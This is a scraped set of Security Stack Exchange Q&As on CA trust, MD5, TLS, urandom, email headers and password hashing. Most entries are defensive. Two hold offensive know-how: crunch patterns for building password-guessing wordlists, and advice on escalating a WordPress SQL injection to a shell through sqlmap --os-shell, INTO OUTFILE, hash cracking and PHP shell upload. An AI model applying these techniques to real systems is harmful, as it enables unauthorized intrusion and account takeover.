<p>The ""weak"" CA are mostly the State-controlled root CA. Microsoft can refuse to include a root key from a private venture, if Microsoft feels that enough insurance has not been provided (they want to be sure that the CA is financially robust, so that operations can be maintained); I know of a bank with millions of customers who tried to get their root key included in Windows, and were dismissed on the basis that they were ""too small"". However, Microsoft is much weaker against official CA from sovereign states; if they want to do business in country X, they cannot really afford to reject the root CA key from government X. Unfortunately, not all governments are ""serious"" when it comes to protecting their CA keys...</p>
","24906"
"How can I generate custom brute-force dictionaries?","34774","","<p>I have found during testing that companies often use variations of their names for critical passwords (for example Microsoft's password might be <em>M1cr0s0f+</em> or <em>m1cros0ft</em> etc etc).</p>

<p>So if I gave it the phrase ""stack exchange' it would ideally compute as many logical variations as possible including things like:</p>

<pre><code>stack_exchange!
</code></pre>

<p>I've seen many <a href=""https://www.google.com.au/search?q=dictionary%20generator&amp;oq=dictionary%20generator&amp;aqs=chrome..69i57.5091j0&amp;sourceid=chrome&amp;ie=UTF-8"" rel=""noreferrer"">dictionary generators</a> but they all seem to do something along the lines of</p>

<pre><code>aaaaaaa
aaaaaab
aaaaaac
aaaaaad
</code></pre>

<p>I'm wondering if there are any tools available that will allow me to generate a large number of permutations given a 'starting' word.</p>
","<p>Try using <a href=""http://sourceforge.net/projects/crunch-wordlist/"">crunch - wordlist generator</a>.</p>

<p>Usage is:</p>

<pre><code>./crunch &lt;from-len&gt; &lt;to-len&gt; [-f &lt;path to charset.lst&gt; charset-name] [-o wordlist.txt or START] [-t [FIXED]@@@@] [-s startblock]
</code></pre>

<p>-t option allows you to specify a pattern, eg: st%ck^%xch%ng%</p>

<p>Where only</p>

<ul>
<li>the @'s will change with lowercase letters</li>
<li>the ,'s will change with uppercase letters</li>
<li>the %'s will change with numbers</li>
<li>the ^'s will change with symbols</li>
</ul>

<hr>

<p>Running as following:</p>

<pre><code>./crunch 14 14 -t st%ck^%xch%ng% -o wordlist.txt
</code></pre>

<p>gives 330000 results:</p>

<pre><code>st0ck!0xch0ng0
st0ck!0xch0ng1
st0ck!0xch0ng2
st0ck!0xch0ng3
st0ck!0xch0ng4
st0ck!0xch0ng5
st0ck!0xch0ng6
...
</code></pre>

<p>You can also modify the charset if you think it's insufficient.</p>
","42240"
"Need to access old forgotten router that only supports SSLv3","34620","","<p>I need to access the web interface of a router standing here in the office.
The problem is that it only supports SSLv3 and I cannot find a browser that allows me to connect to it. In order to update the router, I also need to be able to login to it.</p>

<p>I tried to SSH into it, but it does not work. Maybe it is using some non-standard port.</p>

<p>Running a (limited?) port scan using 'fing' I see it has the following standard ports open:</p>

<ul>
<li>515 (LPD printer)</li>
<li>1723 (PPTP)</li>
</ul>

<p>What browser can I use, or what other options do I have?</p>

<pre><code>Unable to Connect Securely

Firefox cannot guarantee the safety of your data on 192.168.1.1:10443 
because it uses SSLv3, a broken security protocol.
Advanced info: ssl_error_unsupported_version
</code></pre>
","<p>Internet Explorer 11 supports it, but you have to go to Advanced options Tab to enable it.</p>

<p><a href=""https://i.stack.imgur.com/2zoO3.png""><img src=""https://i.stack.imgur.com/2zoO3.png"" alt=""enter image description here""></a></p>
","108679"
"Why do people still use/recommend MD5 if it is cracked since 1996?","34384","","<p>It's still commonly recommended way of hashing passwords, even if it's insecurity had been proven in 1996</p>

<blockquote>
  <p>Therefore we suggest that in the future MD5 should no longer be implemented in applications like signa- ture schemes, where a collision-resistant hash func- tion is required. According to our present knowl- edge, the best recommendations for alternatives to MD5 are SHA-1 and RIPEMD-160.</p>
</blockquote>

<p><em>(The Status of MD5 After a Recent Attack, CryptoBytes, RSA Laboratories, VOLUME 2, NUMBER 2 — SUMMER 1996)</em></p>

<p>Even after this study, and all upcoming papers about it's defects, it has been recommended as password hashing function in web applications, ever since.</p>

<p>It is even used in some Certification Authorities digital signature (according to <a href=""http://rmhrisk.wpengine.com/?p=60"">http://rmhrisk.wpengine.com/?p=60</a> )</p>

<p>What is the reason, why this message digest algorithm is not prohibited yet in meaning of security purposes?</p>

<hr>

<p><strong>Links, took me few minutes to find those</strong></p>

<ul>
<li><a href=""http://www.stottmeister.com/blog/2009/04/14/how-to-crack-md5-passwords/"">http://www.stottmeister.com/blog/2009/04/14/how-to-crack-md5-passwords/</a></li>
<li><a href=""http://viralpatel.net/blogs/java-md5-hashing-salting-password/"">http://viralpatel.net/blogs/java-md5-hashing-salting-password/</a></li>
<li><a href=""http://docs.joomla.org/How_do_you_recover_your_admin_password%3F"">http://docs.joomla.org/How_do_you_recover_your_admin_password%3F</a></li>
<li><a href=""http://wordpress.org/extend/plugins/md5-password-hashes/"">http://wordpress.org/extend/plugins/md5-password-hashes/</a></li>
<li><a href=""http://doc.nette.org/en/security"">http://doc.nette.org/en/security</a></li>
<li><a href=""http://www.justskins.com/forums/so-how-secure-is-98335.html"">http://www.justskins.com/forums/so-how-secure-is-98335.html</a></li>
</ul>
","<p>To complement the good answer from @D.W.: <strong>for password hashing, MD5 is no more broken than any other hash function (but don't use it nonetheless)</strong>.</p>

<hr />

<p>The full picture: <a href=""http://en.wikipedia.org/wiki/MD5"" rel=""noreferrer"">MD5</a> is a <a href=""http://en.wikipedia.org/wiki/Cryptographic_hash_function"" rel=""noreferrer"">cryptographic hash function</a> which, as such, is expected to fulfill three characteristics:</p>

<ul>
<li><strong>Resistance to preimages:</strong> given <em>x</em>, it is infeasible to find <em>m</em> such that <em>MD5(m) = x</em>.</li>
<li><strong>Resistance to second-preimages:</strong> given <em>m</em>, it is infeasible to find <em>m'</em> distinct from <em>m</em> and such that <em>MD5(m) = MD5(m')</em>.</li>
<li><strong>Resistance to collisions:</strong> it is infeasible to find <em>m</em> and <em>m'</em>, distinct from each other, and such that <em>MD5(m) = MD5(m')</em>.</li>
</ul>

<p>MD5 is thoroughly broken with regards to <em>collisions</em>, but not for preimages or second-preimages. Moreover, the 1996 attack (by Dobbertin) did not break MD5 at all; it was a ""collision on the compression function"", i.e. an attack on one of the internal elements of MD5, but not the full function. Cryptographers took it as a warning flag, and they were right because the actual collision attack which was published in 2004 (by Wang) was built from the findings of Dobbertin. But MD5 was broken only in 2004, not 1996, and it was a <em>collision attack</em>.</p>

<p>Collisions are not relevant to password hashing security. Most usages of a hash function for password hashing depend on either preimage resistance, or on other properties (e.g. how well the hash function work when used within <a href=""http://en.wikipedia.org/wiki/Hash-based_message_authentication_code"" rel=""noreferrer"">HMAC</a>, something which cannot be reduced to any of the properties above). MD5 has actually been ""weakened"" with regards to preimages, but only in a theoretical way, because the attack cost is still billions of billions of times too expensive to be really tried (so MD5 is not ""really"" broken with regards to preimages, not in a practical way).</p>

<p><strong>But don't use MD5 anyway</strong>. Not because of any cryptographic weakness, but because MD5 is <em>unsalted</em> and <em>very fast</em>. That's exactly what you do not want in a password hashing function. People who ""recommend MD5"" for password hashing just don't know any better, and they are a testament to a Truth which you should always keep in mind: not everything you find on the Internet is correct and trustworthy. Better solutions for password hashing are known, and have been used and deployed for more than a decade now. See <a href=""https://security.stackexchange.com/questions/211/how-to-securely-hash-passwords/31846#31846"">this answer</a> for details and pointers.</p>
","31871"
"How can mom monitor my internet history from a distance?","34362","","<p>This might sound like a funny question from a twelve-year-old. The less funny part is that I am 21 and currently studying at university (I don't live at University, although I am 15 minutes away. I do not use university network). You might or mightn't believe me, but I have more than enough information to know surefire that both Mom and the university are spying on me from a distance.</p>

<p>I know this sounds really paranoid, but let's not discuss it and instead assume that what I say is true. I am wondering in what ways it could be possible, and how I could counter it. Some information about my situation:</p>

<ul>
<li><p>Mom pays for the internet.</p></li>
<li><p>Mom lives about 500 miles away.</p></li>
<li><p>Mom comes every week-end, but cannot physically access my computer (I am always at home, I would know if she did)</p></li>
<li><p>Mom is incredibly computer-illiterate, but I believe she gets help from people at my uni, as I am sure some of them know more than they should about me.</p></li>
</ul>

<p>My first thoughts were:</p>

<ul>
<li><p>My ISP: she might be calling my (her ...) ISP for internet history. I don't know if it is common practice, but it is theoretically plausible. After all, they can monitor my internet traffic, and since mom pays for the internet, she has legal rights to access history.<br>
I don't really know if there is a way to counter it. Would using Tor work against it?</p></li>
<li><p>Wi-Fi and neighbors: she might have gotten the Wi-Fi key and sent it to neighbors, relaying information to her. However, I rarely, if ever, use Wi-Fi. I am directly connected by cable. It is on though, so I don't know if they can still access my computer.<br>
If that's the case, can I just disable Wi-Fi and just use cable internet? Is there another way to counter it?</p></li>
<li><p>(Unlikely, but still): a trojan has been installed on my computer. However, Kaspersky doesn't tell me that anything is wrong. So I can't do anything about it if I don't find it. That probably won't happen because it most likely doesn't exist, and if it does, it is definitely well-hidden.</p></li>
</ul>

<p>Would Tor solve this problem? Is it all I need? I'd really like to find an alternative solution, since using it for a long time would make me become suspicious even to the eyes of people other than mom.</p>

<hr>

<p>@Matthew Peters: By spying, I mean virtually everything I look up. I don't download much. For example, she might know what youtube videos I watch, or what Wikipedia article I read, basically anything, whether HTTPS or not.</p>
","<p>This sounds like it would mostly likely be some kind of Internet monitoring software (a.k.a legal spyware) installed on your computer when you set it up.  Some ISPs provide this kind of service either network blocking or device monitoring (e..g <a href=""https://recombu.com/digital/article/uk-parental-internet-controls_M10910.html"">this article</a> from the UK).</p>

<p>From the statement that they can view HTTPS connections, we can rule out just standard traffic sniffing as they wouldn't be able to intercept the content of HTTPS connections without having installed a root certificate on your computer.</p>

<p>So a first question would be, did you install any software on your computer when you setup the connection? Can you uninstall it (bearing in mind that it may cause your access to be blocked, depending on how the system is configured)</p>

<p>Assuming that as part of your connection you got a WiFi network, you could try with another device (e.g. cheap tablet, phone) and see whether a) it works and b) your mother is aware of surfing that goes on there.  For example you could go watch <a href=""https://www.youtube.com/watch?v=dQw4w9WgXcQ"">this classic</a> a couple of hundred times on that device and see if she mentions it.</p>

<p>If you don't have access to another device a second option would be to boot your computer into an alternate operating system off a USB key.  that's a pretty cheap approach, and should avoid most spyware software.  something like xubuntu should be light enough to run reasonably from USB.</p>
","120733"
"Are all SSL Certificates equal?","34277","","<p>After running a few tests from <a href=""https://www.ssllabs.com"">Qualsys' SSL Labs</a> tool, I saw that there were quite significant rating differences between a GoDaddy and VeriSign certificate that I have tested against.</p>

<p>Are all SSL certificates from different providers equal? If not, what should one base their decision on? Currently I believe that most people will weigh up the cost vs. brand (I.e.: GoDaddy ~$70.00 vs. Verisign ~$1,500.00).</p>

<p>I have a feeling from what I have seen that a lot of this also depends on how the SSL is actually implemented - would this be a more accurate conclusion?</p>

<p>For clarity:</p>

<ul>
<li><a href=""https://www.ssllabs.com/ssldb/analyze.html?d=seal.godaddy.com/"">Godaddy SSL Lab Report</a></li>
<li><a href=""https://www.ssllabs.com/ssldb/analyze.html?d=google%2ecom&amp;s=74%2e125%2e225%2e84"">Google SSL Lab Report</a></li>
</ul>
","<p>Disclaimer: This answer comes directly from the <a href=""http://www.ehow.com/list_5746563_differences-ssl-certificates.html"">eHow article</a>. No infringement intended.</p>

<blockquote>
  <h3>Domain Validation SSL Certificates</h3>
  
  <p>Domain validated SSL certificates are used to establish a baseline level of trust with a website and prove that you are visiting the website you think you are visiting. These certificates are issued after the SSL issuer confirms that the domain is valid and is owned by the person who is requesting the certificate. There is no need to submit any company paperwork to obtain a Domain Validation SSL certificate, and these types of SSL certificates can be issued extremely quickly. The disadvantage to these types of certificates is that anyone can get them, and they hold no real weight except to secure communication between your web browser and the web server.</p>
  
  <h3>Organization Validation SSL Certificates</h3>
  
  <p>An Organization Validation SSL certificate is issued to companies and provides a higher level of security over a Domain Validation SSL certificate. An Organization Validation certificate requires that some company information be verified along with domain and owner information. The advantage of this certificate over a Domain Validation certificate is that it not only encrypts data, but it provides a certain level of trust about the company who owns the website.</p>
  
  <h3>Extended Validation SSL Certificates</h3>
  
  <p>An Extended Validation SSL Certificate is a ""top of the line"" SSL certificate. Obtaining one requires that a company go through a heavy vetting process, and all details of the company must be verified as authentic and legitimate before the certificate is issued. While this certificate may seem similar to an Organization Validation SSL certificate, the key difference is the level of vetting and verification that is performed on the owner of the domain and the company that is applying for the certificate. Only a company that passes a thorough investigation may use the Extended Validation SSL certificate. This type of certificate is recognized by modern browsers and is indicated by a colored bar in the URL portion of the browser.</p>
</blockquote>

<p>Additonally, OV versus EV also have an impact in terms of insurance amounts in case of compromise. The insurance premium for an EV lies a lot higher than with an OV.</p>

<p>Read more/original: <a href=""http://www.ehow.com/list_5746563_differences-ssl-certificates.html"">Mickey Walburg, Differences in SSL Certificates | eHow.com</a></p>
","13454"
"Email headers from messages sent via Gmail online client contain private IP addresses. What are these addresses?","34136","","<p>Someone has sent a sensitive email from my Gmail account. I wanted to trace the IP address by checking out the <code>Received: by X</code> field in the header of the sent message. </p>

<p>However, every message that is sent from Gmail and that I check the header from has (the same) private IP address in the <code>Received: by X</code> section. The field always looks like this:</p>

<pre><code>Received: by 10.42.43.138 with HTTP; {Date}
</code></pre>

<p>Where does this IP come from? Why is this the 'Received by' IP address in all sent messages? Messages sent via email clients (like Apple Mail) do show correct 'Received by' IP addresses. Is this some kind of privacy thing Gmail does?</p>
","<p>When reading a raw email message including all of its headers, the <code>Received:</code> headers are best read from bottom to top. Here, I'll show an example of an email I've received on my GMail account</p>

<pre><code>Delivered-To: MYEMAIL@gmail.com
Received: by x.x.x.x with SMTP id xxxxxxxx;
        Tue, 3 Sep 2013 xx:xx:xx -0700 (PDT)
Received: from a.b.c.com (a.b.c.com. [x.x.x.x])
        by mx.google.com with ESMTP id xxx;
        Tue, 03 Sep 2013 xx:xx:xx-0700 (PDT)
Received: from localhost (127.0.0.1) by a.b.c.com id xxx for MYEMAIL@gmail.com&gt;; Tue, 3 Sep 2013 xx:xx:xx +0000 (envelope-from &lt;bounce-xxxxxxxx@c.com&gt;)
From: xxxx&lt;xxxxx@xxxxx.com&gt;
Sender: xxxx &lt;xxxx@a.b.c.com&gt;
Subject: xxxxxxxx
</code></pre>

<p>When you want to send an email, you give it to your service provider who will attach the first <code>Received:</code> header, and as the message passes through different relays and mail servers, each one of them attaches its own address until the message reaches its final destination - the recipient's service provider.</p>

<p>So what you're seeing there in the first <code>Received:</code> header is actually GMail's server. That's why you have it in all of your messages, because that's where all the messages end up in your case, in your account on GMail's servers.</p>

<p><strong>Please note</strong> that there's really no way to reliably identify the IP address of an email sender. However, <code>Received:</code> header chain can give you some idea.</p>
","41830"
"Is it dangerous to call spam phone numbers, even if you know they're spammers?","34124","","<p>I sometimes like to check spam just to see how the messages look like, and I found someone who actually put an American phone number (1-XXX-XXX-XXXX). Most of these spammers are either trying to get money out of you, or hack you in ways like disguising as services like Google+.</p>

<p>Not that I actually want to, but I am curious if calling the number would do something to my phone. How could a hacker possibly access sensitive information just by tricking someone into calling. I have heard (no idea where), that some numbers when called, will charge you an enormous bill. Could this be true?</p>
","<h2>Can you get ""hacked"" by calling a number?</h2>

<blockquote>
  <p>I am curious if calling the number would do something to my phone. How could a hacker possibly access sensitive information just by tricking someone into calling. </p>
</blockquote>

<p>It could be a hack, or it could be a <em>prelude</em> to a hack. Here are some rough examples:</p>

<ol>
<li>If you call them, the spammer can find out if that phone number is owned by an actual person. The spammer can also easily fake the same area code as you, and set up a clever social engineering trick that may involve you thinking with the wrong head.</li>
<li><p>If you're dumb enough to call them, you may be gullible enough to fork over additional information. If you're dumb enough, they may call you from <em>other</em> numbers, or forward you to another number.</p></li>
<li><p>There may also be an <a href=""http://www.androidcentral.com/stagefright"">exploit</a> in your phone's processing of various messages/content types. While they could easily target all phones at once by using some form of auto-messaging feature, this may be easily stopped by carriers. </p></li>
</ol>

<p>Learning more about you allows an attacker to guess secret answers, passwords, etc. If you're the gullible type, chances are you don't have a good password policy, or you could be tricked into visiting a malicious website, or both.</p>

<hr>

<h2>But why not just send infected videos or pictures to everyone?</h2>

<p>Let's assume the spammer has developed, or found, a program that helps with automatically dialing phone numbers.</p>

<p>If they're sending an infected video or picture to multiple recipients, they may quickly run out of data. It's far cheaper and easier to target people individually, especially those gullible enough to call the number. </p>

<p>In fact, if they target everyone, then that also increases the chance of their scam becoming well-known. By limiting their attacks only to the gullible, they've found a very good way to limit detection <em>and</em> knowledge of their particular scam.</p>

<p>The reason why they'd want to limit knowledge is that many folks may be searching for a <em>particular</em> scam, not exactly <em>their</em> specific scam. This is a problem with many gullible people: they can't really think outside the box, and not realize it's the same type of scam, but with different features. </p>

<hr>

<h2>Your information helps scammers engage in Social Engineering tactics</h2>

<p>Have you ever tried to contact customer service for anything important, such as banks, online game accounts, websites, etc? Usually, they need specific information from you, or someone pretending to be you, in order to handle your request.</p>

<p>In fact, just recently, I was able to social-engineer a customer service representative for an account of mine by providing details on things I knew about me, without actually providing any real concrete details, or even providing my identity. All I needed was a few bits of information about myself.</p>

<p><strong>Social Engineering</strong> is a tactic used everywhere, and often results in  <a href=""http://www.nydailynews.com/news/national/hacker-dumps-info-thousands-homeland-security-workers-article-1.2524440"">astounding success</a> because people in general are ill-equipped to handle it. If a spammer has your phone number, then it may be possible for them to get <em>other</em> information. Maybe your phone number is tied to different accounts. </p>

<p>Maybe they have a partial database of credentials stolen from various websites, which could include <em>more</em> information on you. Maybe that database includes information on your <em>email address</em>, which will allow the scammer to continue their campaign of phishing without you realizing it.</p>

<hr>

<h2>Can calling spam numbers cost me money?</h2>

<blockquote>
  <p>I have heard (no idea where), that some numbers when called, will charge you an enormous bill. Could this be true?</p>
</blockquote>

<p>Yes, this is possible. </p>

<p>If you're calling a <a href=""https://en.wikipedia.org/wiki/Premium-rate_telephone_number"">premium-rate telephone number</a>, then that could cost you a lot of money when you call them. If you text a number associated with a ""donation"", whether it's legitimate or a scam, your phone bill will likely include additional charges.</p>
","113067"
"why a client authentication is not commonly performed in the TLS protocol?","34031","","<p>Is there any reason for this other than key/certificate management on the client-side?</p>
","<p><strong>What is authentication ?</strong> That's making sure that whoever is at the other end of the tunnel is <em>who you believe</em>. It really depends on the kind of <em>identity</em> that you want to use.</p>

<p>For most Web sites, the interesting notion is <em>continuity</em>. They do not really care who is connected; indeed, the point of a Web site is to be readable by <em>everybody</em>. The kind of authenticity that a Web site wishes to achieve is to make sure that two successive requests are really from the same client (whoever that client may be). This is because the Web site experience is that of a logical succession of pages, driven by the user's actions (the links on which he clicks), and meddling with that movie-like framework is what the attacker is after. The user and the Web site designers think in terms of <em>sessions</em> and the attacker wants to hijack the session.</p>

<p>This authenticity is achieved by several mechanisms:</p>

<ul>
<li>Successive HTTP requests from the same client go through the same connection (with the ""keep-alive"" feature).</li>
<li>SSL offers a session resumption mechanism, which reuses the negotiated shared key (that's the ""abbreviated handshake"" described in section 7.3 of the <a href=""http://tools.ietf.org/html/rfc5246"">SSL/TLS standard</a>).</li>
<li>The HTTP request can include a <em>cookie</em> which the server chooses; typically, a random, user-specific value is sent as a cookie to the user, and, upon seeing it coming back in subsequent requests, the server is convinced that the requests come from the same user.</li>
</ul>

<p>The cookie is <em>sufficient</em> to ensure continuity.</p>

<p><strong>What extra value would client certificates add ?</strong> Well, not much. <a href=""http://en.wikipedia.org/wiki/Public_key_certificate"">Certificates</a> are a way to distribute key/name bindings. There are mostly three scenarios where client certificates (in a Web context) are relevant:</p>

<ol>
<li><p>The Web server needs an extended notion of user identity, which is defined by <em>someone else</em>. For instance, imagine a governmental service that can be accessed by citizens, but only after proper authentication, e.g. an online election system. What makes the citizen, with his definite name and birth date, is managed by the State at large, but not the same part of it than the one running the service. Client certificates are then a way to transport the authentication from the PKI which issued the certificate to the citizen, to the online election system which is not at all entitled to say who is named what, but must nonetheless keep clear records of who connects.</p></li>
<li><p>The system designer has little trust in the robustness of existing Web browsers. If a user's browser is hijacked, then the secret cookie can be stolen and the user has basically lost, forever. On the other hand, if the user has a smart card, and <em>that</em> smart card stores a private key (which is used in combination with a client certificate), then a complete browser hijacking is still a big issue, but it is more <em>contained</em>: since the smart card will commit honourable seppuku instead of letting the precious private key be revealed, the situation can be recovered from. Once the mandatory format-and-reinstall has been performed, things are secure once again.</p></li>
<li><p>The Web site does not only want authenticity, it also wishes to get <strong>non-repudiation</strong>. Non-repudiation is a legal concept which needs some support from the technical parts of the system, and that support is <a href=""http://en.wikipedia.org/wiki/Digital_signature"">digital signatures</a>. We are outside of what SSL/TLS provides, here. In no way can a SSL/TLS client authentication be a proof which could be used to resolve some legal conflict between the user and the server itself (a bank server cannot show the transcript of the connection and say ""see, that user <em>really</em> asked me to buy these actions at that price"", because the bank could easily have fabricated the whole transcript). For such things, one needs client certificates and some client-side code which uses the certificate to sign the actual data. However, once the hard work of issuing certificates to clients has been performed, it makes sense to just use them for HTTPS.</p></li>
</ol>

<p><strong>In the common case</strong> of a Web server, none of these scenarios apply. So client certificates are not used, because they would raise practical issues while not adding any extra value. That would be a solution in search of a problem.</p>
","23893"
"https security - should password be hashed server-side or client-side?","34014","","<p>I am building a web application which requires users to login. All communication goes through https. I am using bcrypt to hash passwords.</p>

<p>I am facing a dilemma - I used to think it is safer to make a password hash client-side (using JavaScript) and then just compare it with the hash in DB server-side. But I am not sure this is any better than sending plain-text password over https and then hashing it server-side. </p>

<p>My reasoning is that if attacker can intercept the https traffic (= read plaintext password) he can for example also change the JavaScript so it sends the plaintext password alongside the hashed one - where he can intercept it.</p>

<p>The reason <em>against</em> hashing client-side is just ease of use. If I hash client-side I need to use two separate libraries for hashing. This is not an unsurmountable problem, but it is a nuisance.</p>

<p>Is there a safety gain in using client-side hashing? Why?</p>

<p>Should I also be using challenge-response then?</p>

<p><strong>UPDATE:</strong> what interests me the most is this - do these techniques (client-side hashing, request-response) add any significant security gain in case where <strong>https</strong> is used? If so, why?</p>
","<p>If you hash on the client side, the hashed password becomes the actual password (with the hashing algorithm being nothing more than a means to convert a user-held mnemonic to the actual password).  This means that you will be storing the full ""plain-text"" password (the hash) in the database, and you will have lost all benefit of hashing in the first place.  If you decide to go this route, you might as well forgo any hashing and simply transmit and store the user's raw password (which, incidentally, I wouldn't particularly recommend).</p>
","8600"
"Uploading Shell Using SQLI","33891","","<p>I found an <a href=""http://cxsecurity.com/issue/WLB-2013020035"" rel=""nofollow"">SQL injection vulnerability in a Wordpress installation</a> inside one of my lab machines and I am trying to leverage it to upload a shell.</p>

<p>I can get the admin hash but it seems that it is quite complex as JTR and HASHCAT are taking long times without luck.</p>

<p>Here is the basic output from SQLmap:</p>

<pre><code>web server operating system: Linux Ubuntu xxxxxxxxx
web application technology: PHP 5.2.6, Apache 2.2.11
back-end DBMS: MySQL 5
[02:24:38] [INFO] testing if current user is DBA
[02:24:38] [INFO] fetching current user
current user is DBA:    True
[02:24:38] [INFO] fetching database names
[02:24:38] [INFO] the SQL query used returns 3 entries
[02:24:38] [INFO] resumed: ""information_schema"",""information_schema""
[02:24:38] [INFO] resumed: ""mysql"",""mysql""
[02:24:38] [INFO] resumed: ""wordpress"",""wordpress""
available databases [3]:                                                                                                                                               
[*] information_schema
[*] mysql
[*] wordpress
</code></pre>

<p>I tried <code>--os-shell</code> option but It seems no write access as I get these errors:</p>

<blockquote>
  <p>[02:26:36] [WARNING] unable to retrieve automatically any web server
  path</p>
  
  <p>[02:26:36] [INFO] trying to upload the file stager on '/var/www' via
  LIMIT INTO OUTFILE technique</p>
  
  <p>[02:26:37] [WARNING] unable to upload the file stager on '/var/www'</p>
  
  <p>[02:26:37] [INFO] trying to upload the file stager on '/var/www' via
  UNION technique</p>
  
  <p>[02:26:37] [WARNING] expect junk characters inside the file as a
  leftover from UNION query</p>
  
  <p>[02:26:38] [WARNING] it looks like the file has not been written, this
  can occur if the DBMS process' user has no write privileges in the
  destination path</p>
</blockquote>

<p>I can get --sql-shell without problem. I tried the steps here (<a href=""http://evilzone.org/tutorials/upload-shell-with-sql-injection/"" rel=""nofollow"">http://evilzone.org/tutorials/upload-shell-with-sql-injection/</a>) to upload a shell but I get the following error</p>

<blockquote>
  <p>[02:00:16] [WARNING] execution of custom SQL queries is only available
  when stacked queries are supported</p>
</blockquote>

<p>Now, I need a way to upload a shell to the target machine, any thoughts? Also any thoughts where I can crack Wordpress admin password hash online?</p>
","<p>First of all if you are debugging a sqlmap failure you need to turn up the verbosity.  No one can actually answer this question,  because you did not gather the appropriate information. </p>

<p>The <code>--os-shell</code> works for MySQL by attempting to use an <code>into outfile</code> to write a file to the web root.   This can fail for any number of reasons.  The most common reason being that the database and web server and different machines.  Ubuntu's default AppArmor rule sets forbid MySQL from writing to /var/www/. Also, <code>into outfile</code> requires file privileges that should never be granted (but often is).  You could try using sqlmap's file-io functionality to read and write to the remote file system.  </p>

<p>in the context of this application, dumping the contents of the Wordpress MySQL database will yield the administrator's password hash.  Cracking this hash will yield a Wordpress admin account which almost always has the ability to upload and install Wordpress extensions.... or PHP shells. </p>
","44762"
"Is a rand from /dev/urandom secure for a login key?","33819","","<p>Lets say I want to create a cookie for a user. Would simply generating a 1024 <em>bit</em> string by using <a href=""http://en.wikipedia.org/wiki/Urandom#Linux"">/dev/urandom</a>, and checking if it already exists (looping until I get a unique one) suffice?</p>

<p>Should I be generating the key based on something else? Is this prone to an exploit somehow?</p>
","<p>The short answer is yes. The long answer is also yes. <code>/dev/urandom</code> yields data which is indistinguishable from true randomness, given existing technology. Getting ""better"" randomness than what <code>/dev/urandom</code> provides is meaningless, unless you are using one of the few ""information theoretic"" cryptographic algorithm, which is not your case (you would know it).</p>

<p>The man page for <code>urandom</code> is somewhat misleading, arguably downright wrong, when it suggests that <code>/dev/urandom</code> may ""run out of entropy"" and <code>/dev/random</code> should be preferred; the only instant where <code>/dev/urandom</code> <em>might</em> imply a security issue due to low entropy is during the first moments of a fresh, automated OS install; if the machine booted up to a point where it has begun having some network activity then it has gathered enough physical randomness to provide randomness of high enough quality for all practical usages (I am talking about Linux here; on FreeBSD, that momentary instant of slight weakness does not occur at all). On the other hand, <code>/dev/random</code> has a tendency of blocking at inopportune times, leading to very real and irksome usability issues. Or, to say it in less words: use <code>/dev/urandom</code> and be happy; use <code>/dev/random</code> and be sorry.</p>

<p>(<strong>Edit:</strong> <a href=""http://www.2uo.de/myths-about-urandom/"" rel=""noreferrer"">this Web page</a> explains the differences between <code>/dev/random</code> and <code>/dev/urandom</code> quite clearly.)</p>

<p>For the purpose of producing a ""cookie"": such a cookie should be such that no two users share the same cookie, and that it is computationally infeasible for anybody to ""guess"" the value of an existing cookie. A sequence of random bytes does that well, provided that it uses randomness of adequate quality (<code>/dev/urandom</code> is fine) and that it is <em>long enough</em>. As a rule of thumb, if you have less than <em>2<sup>n</sup></em> users (<em>n = 33</em> if the whole Earth population could use your system), then a sequence of <em>n+128</em> bits is wide enough; you do not even have to check for a collision with existing values: you will not see it in your lifetime. 161 bits fits in 21 bytes.</p>

<p>There <em>are</em> some tricks which are doable if you want shorter cookies and still wish to avoid looking up for collisions in your database. But this should hardly be necessary for a cookie (I assume a Web-based context). Also, remember to keep your cookies confidential (i.e. use HTTPS, and set the cookie ""secure"" and ""HttpOnly"" flags).</p>
","3939"
"Better techniques than url parameter encryption","33781","","<p>I'm a programmer working on an application where the only choice/vs/deadline was to implement symmetric encryption on url parameter values.  The data is insensitive in nature, but we needed to prevent sales agents from peeking on each other's leads.  (Keys are generated on session creation and are cryptographically strong.)  Sessions are expected to end frequently.  </p>

<p>The role hierarchy was Manager-->Supervisor-->Agents.  The data structures don't currently account for these roles in a way to strictly enforce who can see what.  Getting this information from the database was NOT anywhere close to straightforward.  (Recursive Database.)  </p>

<p>I know that this technique is way down on the list as a defense against parameter manipulation.  What would have been a better technique?  </p>

<p>Constraints:<br>
Role-based checking is not an option.  </p>

<p>[Additional information]
The urls built and sent to the client before I made any changes looked like:</p>

<pre><code>https://www.example.com/agent/?producerId=12345
</code></pre>

<p>The specific threat surface here is parameter manipulation against ?agentId=12345.
Agent ids are assigned uniquely to each agent.  So if Agent A wants to look at Agent B's stats, he could have entered agentId=22222 in order to look at that agent's quotes and current sales statistics.  </p>

<p>Again, Role-Based checking was not an option for me:  I was unable to make changes to the database OR the persistence tier.</p>

<p>My solution was to use a session-created encryption key (using Java's KeyGenerator class) and encrypting the outbound urls sent to the client.  So now, the url looks like:</p>

<pre><code>https://www.example.com/agent/?producerId=&lt;ciphertext&gt;
</code></pre>

<p>Now, if someone tries agentId=22222, the server will decrypt what it <em>thinks</em> is ciphertext and will ultimately create an invalid character sequence.</p>

<p>(This leaves open the possibility that an existing agentId <em>could</em> be found, but quite unlikely that it would be relevant to the person performing the attack.  </p>

<p>I will stress that this question isn't about optimal security (which would be role-based checking to ensure resource access) and about trying to squeeze some security in a grey area.<br>
===============Update============
The parameter encryption solution here was recommended to me by one of our security guys.  I got one takeaway I hadn't considered on this solution--broken urls--and will be using <em>that</em> as well as the maintenance issue created by this solution to argue for the time to enforce the access rules in a less stopgap fashion.  </p>
","<p>Good question!  Thanks for elaborating on the threat you are trying to defend against.  I have edited my answer accordingly.</p>

<p><strong>Summary.</strong> Your primary defense should be <em>access control</em>.  You need to limit which users can view which pages.  Details below.</p>

<p><strong>Access control in web applications.</strong> What you need to do is check that the user is authorized to access the data you're going to show on a page, before allowing them to see that data.  This basically comes down to access control: you want controls that limit which users can view which data, based upon some authorization policy.</p>

<p>It sounds like you have a sequence of pages, one for each agent:</p>

<pre><code>http://www.example.com/agent/?producerId=12345
http://www.example.com/agent/?producerId=12346
http://www.example.com/agent/?producerId=12347
...
</code></pre>

<p>where the producerIds (agentIds) are potentially guessable or predictable.  You want to ensure that agent 12345 can view <code>http://www.example.com/agent/?producerId=12345</code> but not any of the other pages.  OK.</p>

<p>This is a bog-standard situation, and the bog-standard defense is: access control.</p>

